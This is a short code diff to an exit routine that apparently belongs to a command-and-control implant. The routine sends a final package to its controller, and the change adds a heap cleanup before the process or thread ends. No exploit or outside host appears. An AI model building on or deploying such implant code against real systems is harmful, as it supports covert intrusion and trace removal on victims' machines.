@@ -1437,6 +1437,8 @@ auto DECLFN Task::Exit(
     PACKAGE* Package = Self->Pkg->Create( Job->CmdID, Job->UUID );
     Self->Pkg->Transmit( Package, 0, 0 );
 
+    Self->Hp->Clean();
+
     if ( ExitType == Enm::Exit::Proc ) {
         Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
     } else if ( ExitType == Enm::Exit::Thread ) {
